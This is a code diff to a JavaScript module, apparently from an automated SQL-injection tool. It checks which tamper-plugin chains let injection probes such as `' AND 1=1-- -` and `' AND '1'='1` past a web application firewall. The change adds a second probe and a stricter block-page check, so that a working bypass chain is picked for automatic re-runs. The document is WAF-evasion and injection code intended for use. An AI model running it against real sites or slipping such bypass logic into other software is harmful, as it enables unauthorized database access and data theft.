@@ -16,9 +16,15 @@ import { logger } from '../logger.js';
 const BLOCKED_STATUSES = new Set([403, 406, 429, 501, 503]);
 const MAX_CHAINS = 3; // 最多验证 3 条候选链（预算约束）
 
-function looksBlocked(res, baseLen) {
+function looksBlocked(res, baseLen, { strict = false } = {}) {
   if (!res) return true;
   if (BLOCKED_STATUSES.has(res.status)) return true;
+  // [P0-FIX 2026-09-10] 链验证阶段（strict）只认硬拦截信号（状态码 / 拦截页文案）：
+  // 「响应体缩水至基线 50%」是给**裸探针**判「WAF 对该形态敏感」用的启发式，但把它套到
+  // **链验证**上是误判——payload 一旦真正生效，结果集本就变空/变短（如 /blind 恒返回空页），
+  // 于是每条链都被判「仍被拦」→ 全部候选失败 → 重跑被跳过（实测 blind 场景
+  // `3 条候选链探针均被拦截，跳过自动重跑`）。链验证要回答的是「WAF 是否放行」，不是「响应是否变短」。
+  if (strict) return /blocked by|request blocked|access denied|安全狗|拦截/i.test(String(res.data ?? ''));
   const len = String(res.data ?? '').length;
   if (baseLen > 0 && len < baseLen * 0.5) return true;
   return false;
@@ -39,10 +45,13 @@ export async function verifyTamperChains({ httpClient, target, point, chains, co
   const list = Array.isArray(chains) ? chains.filter((c) => c && Array.isArray(c.plugins) && c.plugins.length) : [];
   if (!httpClient || !target || !point || list.length === 0) return null;
   const orig = point.originalValue || '1';
-  // 探针：引号闭合 + 无引号布尔段。选它的原因：space2comment 引号状态机不替换
-  // 引号内空格（`' AND '` 中空格在闭合外才能变换），无引号段保证各 tamper 均可改变形态，
-  // 便于放行判定不被「链变换后与裸形态相同」干扰。
-  const probeValue = `${orig}' AND 1=1-- -`;
+  // [P0-FIX 2026-09-10 实战实测] 探针族（原来是单探针，有致命盲区）：
+  //   探针① `${orig}' AND 1=1-- -`  —— 带注释尾巴；
+  //   探针② `${orig}' AND '1'='1`   —— 引号闭合，无 -- / # / 空格依赖。
+  // 单探针的问题：真实 WAF（含本次实测靶场）普遍拦 `--`，探针①无论套什么链都恒 403 →
+  // 所有链被误判「仍被拦」→ 自适应重跑直接跳过。探针②在拦注释的场景下仍能证明链价值。
+  // 判据：裸探针需「全部被拦」才认定 WAF 敏感；链验证「任一探针放行」即通过。
+  const probeValues = [`${orig}' AND 1=1-- -`, `${orig}' AND '1'='1`];
   const send = async (value, plugins) => {
     const t0 = Date.now();
     // [FIX] 用入参 value（基线发原值、探针发注入串）；plugins 才套 tamper
@@ -67,18 +76,25 @@ export async function verifyTamperChains({ httpClient, target, point, chains, co
     const baseLen = base.res ? String(base.res.data ?? '').length : 0;
     if (!base.res) return null; // 目标不可达 → 无法验证
 
-    // 2) 未套 tamper 的裸探针：未被拦 → WAF 对该形态不敏感，保守返回首条链（对齐旧行为）
-    const raw = await send(probeValue, null);
-    if (!looksBlocked(raw.res, baseLen)) return list[0];
+    // 2) 未套 tamper 的裸探针：**全部**被拦才认定 WAF 对该形态敏感；
+    //    任一放行 → WAF 不敏感，保守返回首条链（对齐旧行为）
+    let allRawBlocked = true;
+    for (const pv of probeValues) {
+      const raw = await send(pv, null);
+      if (!looksBlocked(raw.res, baseLen)) { allRawBlocked = false; break; }
+    }
+    if (!allRawBlocked) return list[0];
 
-    // 3) 逐链验证：探针套链后未被拦截 → 该链有效
+    // 3) 逐链验证：任一探针套链后未被拦截 → 该链有效（strict：只认硬拦截）
     for (const chain of list.slice(0, MAX_CHAINS)) {
-      const t = await send(probeValue, chain.plugins);
-      if (!looksBlocked(t.res, baseLen)) {
-        logger.info(
-          `WAF 链验证：[${chain.plugins.join(',')}] 探针放行（${t.elapsed}ms），候选共 ${list.length} 条`
-        );
-        return chain;
+      for (const pv of probeValues) {
+        const t = await send(pv, chain.plugins);
+        if (!looksBlocked(t.res, baseLen, { strict: true })) {
+          logger.info(
+            `WAF 链验证：[${chain.plugins.join(',')}] 探针放行（${t.elapsed}ms），候选共 ${list.length} 条`
+          );
+          return chain;
+        }
       }
     }
     logger.warn(`WAF 链验证：${Math.min(list.length, MAX_CHAINS)} 条候选链探针均被拦截，跳过自动重跑`);
